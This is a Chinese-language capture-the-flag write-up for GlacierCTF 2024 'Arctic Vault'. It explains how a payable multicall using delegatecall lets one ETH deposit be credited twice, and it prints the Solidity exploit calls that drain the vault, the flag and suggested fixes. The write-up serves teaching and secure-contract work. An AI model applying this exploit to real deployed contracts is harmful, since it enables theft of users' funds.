# GlacierCTF 2024 Arctic Vault

## 题目简述

题目合约提供 `deposit()`、`withdraw()` 和批量调用接口 `multicallThis()`。`Setup` 预先向金库存入 1 ETH，攻击目标是把金库余额清零。

批量接口用 `delegatecall` 对自身逐项执行 calldata。`delegatecall` 会在每次子调用中保留最外层的 `msg.sender` 和 `msg.value`，因此同一笔 ETH 可以被 `deposit()` 重复记账，形成高于真实余额的内部余额。

## 解题过程

### 1. 确认 `msg.value` 会被重复使用

批量函数的核心循环为：

```solidity
for (uint256 i; i < data.length; ++i) {
    (bool success,) = address(this).delegatecall(data[i]);
    require(success);
}
```

存款函数只做：

```solidity
balances[msg.sender] += msg.value;
```

外层调用只向合约转入一次 ETH，但每次 `delegatecall` 看到的 `msg.value` 都是同一个非零值。批量执行两次 `deposit()`，账本就累计两次。

### 2. 用 1 ETH 获得 2 ETH 余额

构造两个相同的子调用：

```solidity
bytes[] memory calls = new bytes[](2);
calls[0] = abi.encodeCall(vault.deposit, ());
calls[1] = abi.encodeCall(vault.deposit, ());
vault.multicallThis{value: 1 ether}(calls);
```

执行后的状态是：

- 金库原有 1 ETH，加上攻击者真实转入的 1 ETH，链上余额为 2 ETH；
- 攻击者内部余额被两次 `deposit()` 各增加 1 ETH，记账余额也是 2 ETH。

随后调用 `withdraw()`，合约按内部余额转出完整 2 ETH，正好清空金库。仓库中的 flag 为：

```text
gctf{Me55age_d0t_wh4t?}
```

## 方法总结

本题利用了 payable multicall 与 `delegatecall` 的语义组合。批量执行的每个子调用并不是各自收到一笔资金，却都能读取同一个 `msg.value`。修复方式包括禁止带 value 的批量入口、只允许一个子调用消费 value，或改成显式传递且校验每项金额；凡是 `delegatecall` 到 payable 逻辑，都应检查 `msg.sender`、`msg.value` 和存储上下文是否会被重复复用。
